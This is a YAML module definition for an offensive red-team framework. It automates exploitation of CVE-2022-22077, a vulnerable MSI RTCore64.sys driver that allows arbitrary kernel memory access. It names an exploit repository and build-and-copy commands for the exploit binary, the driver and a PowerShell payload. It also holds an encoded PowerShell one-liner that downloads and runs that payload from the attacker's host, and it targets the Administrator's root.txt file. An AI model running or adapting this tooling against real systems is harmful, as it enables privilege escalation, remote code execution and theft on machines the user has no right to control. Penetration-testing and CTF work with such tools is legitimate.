name: CVE-2022-22077
description: >
  CVE-2022-22077 is a high-severity vulnerability (CVSS score 7.8) affecting the RTCore64.sys driver distributed with MSI Center and Dragon Center applications. The vulnerability stems from exposed IOCTL interfaces that allow unprivileged users to perform arbitrary physical memory reads and writes, effectively bypassing all Windows kernel security mechanisms.
author: "LazyOwn RedTeam"
version: "1.0"
enabled: true
params:
  - name: lhost
    type: string
    required: true
    description: lhost target.
tool:
  name: CVE-2022-22077
  repo_url: https://github.com/grisuno/CVE-2022-22077.git
  install_path: external/.exploit/CVE-2022-22077
  install_command: ./install.sh
  execute_command: git restore . ; git pull ; chmod +x *.sh && ./build.sh && cp payload.ps1 ../../../sessions/payload.ps1 && cp exploit.exe ../../../sessions/exploit.exe && cp RTCore64.sys ../../../sessions/RTCore64.sys
  download_file: C:\Users\Administrator\Desktop\root.txt
  lazycommand: >-
    encodewinbase64 powershell -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://{lhost}/payload.ps1\")'
